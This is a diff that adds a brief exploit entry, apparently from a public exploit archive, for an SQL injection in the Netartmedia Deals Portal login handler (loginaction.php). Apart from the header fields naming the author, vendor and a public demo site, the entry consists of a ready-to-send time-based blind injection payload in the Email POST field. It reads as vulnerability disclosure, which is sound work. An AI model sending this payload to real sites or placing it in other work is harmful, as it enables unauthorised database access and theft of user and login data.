@@ -1,0 +1,13 @@
+# Exploit Title: Netartmedia Deals Portal - 'Email' SQL Injection
+# Date: 20.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://www.netartmedia.net/dealsportal/
+# Demo Site: https://www.phpscriptdemos.com/deals/i
+# Version: Lastest
+# Tested on: Kali Linux
+# CVE: N/A
+----- PoC: SQLi -----
+# Request: http://localhost/[PATH]/loginaction.php
+# Vulnerable Parameter: Email (POST)
+# Attack Pattern:
+Email=0'XOR(if(now()=sysdate()%2Csleep(0)%2C0))XOR'Z&Password=g00dPa%24%24w0rD&lang=en&mod=login
